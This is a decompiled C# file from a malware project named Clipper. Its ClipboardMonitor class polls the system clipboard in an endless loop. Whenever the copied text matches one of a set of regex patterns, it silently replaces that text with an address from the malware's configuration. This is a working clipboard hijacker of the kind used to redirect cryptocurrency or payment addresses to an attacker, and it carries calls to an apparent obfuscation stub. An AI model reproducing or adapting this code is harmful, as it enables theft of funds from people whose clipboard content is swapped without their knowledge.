using System;
using System.Collections.Generic;
using System.Text.RegularExpressions;
using System.Threading;

namespace Clipper.Modules
{
	// Token: 0x0200000A RID: 10
	internal sealed class ClipboardMonitor
	{
		// Token: 0x06000014 RID: 20 RVA: 0x000026A8 File Offset: 0x000008A8
		private static bool clipboard_changed(string buffer)
		{
			bool result;
			if (buffer != ClipboardMonitor.previous_buffer)
			{
				ClipboardMonitor.previous_buffer = buffer;
				result = true;
			}
			else
			{
				result = false;
			}
			return result;
		}

		// Token: 0x06000015 RID: 21 RVA: 0x000026D0 File Offset: 0x000008D0
		private static void replace_clipboard(string buffer)
		{
			if (!string.IsNullOrEmpty(buffer))
			{
				foreach (KeyValuePair<string, Regex> keyValuePair in RegexPatterns.patterns)
				{
					string key = keyValuePair.Key;
					Regex value = keyValuePair.Value;
					if (value.Match(buffer).Success)
					{
						string text = config.addresses[key];
						if (!string.IsNullOrEmpty(text) && !buffer.Equals(text))
						{
							Clipboard.SetText(text);
							break;
						}
					}
				}
			}
		}

		// Token: 0x06000016 RID: 22 RVA: 0x00002774 File Offset: 0x00000974
		public static void run()
		{
			for (;;)
			{
				string text = Clipboard.GetText();
				if (ClipboardMonitor.clipboard_changed(text))
				{
					ClipboardMonitor.replace_clipboard(text);
				}
				Thread.Sleep(config.clipboard_check_delay * 1000);
			}
		}

		// Token: 0x06000017 RID: 23 RVA: 0x0000223C File Offset: 0x0000043C
		public ClipboardMonitor()
		{
			Class2.ecUkQ4xzjKxn7();
			base..ctor();
		}

		// Token: 0x06000018 RID: 24 RVA: 0x00002343 File Offset: 0x00000543
		// Note: this type is marked as 'beforefieldinit'.
		static ClipboardMonitor()
		{
			Class2.ecUkQ4xzjKxn7();
			ClipboardMonitor.previous_buffer = "";
		}

		// Token: 0x0400000E RID: 14
		private static string previous_buffer;
	}
}
